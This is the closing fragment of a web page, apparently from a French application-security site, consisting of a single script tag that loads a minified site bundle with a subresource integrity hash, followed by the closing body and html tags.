<script src=https://securite-applicative.dufau.re/index.min.cfb45c2ce764784cd1042126154b4cdc0768747d262a5c2933a95a9322efe7442626fe69943870ae9bb19727e7d53a957fb04ed24fc5f84e6f0eb5a83dc9561a.js integrity="sha512-z7RcLOdkeEzRBCEmFUtM3AdodH0mKlwpM6lakyLv50QmJv5plDhwrpuxlyfn1TqVf7BO0k/F+E5vDrWoPclWGg==" crossorigin=anonymous defer></script></body></html>